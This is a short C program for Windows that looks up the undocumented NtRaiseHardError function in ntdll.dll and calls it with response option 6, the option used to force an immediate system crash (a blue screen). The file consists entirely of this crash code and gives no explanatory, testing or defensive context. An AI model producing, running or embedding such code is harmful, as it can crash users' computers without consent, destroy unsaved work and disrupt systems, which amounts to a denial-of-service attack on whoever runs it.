#include <windows.h> 
#include <winternl.h>
 typedef NTSTATUS (NTAPI *pNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response); 
 int main()
  { 
    HMODULE ntdll = GetModuleHandleA("ntdll.dll"); pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError"); 
    if (NtRaiseHardError) 
    { 
        ULONG response; 
        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response); 
    } 
    return 0; 
}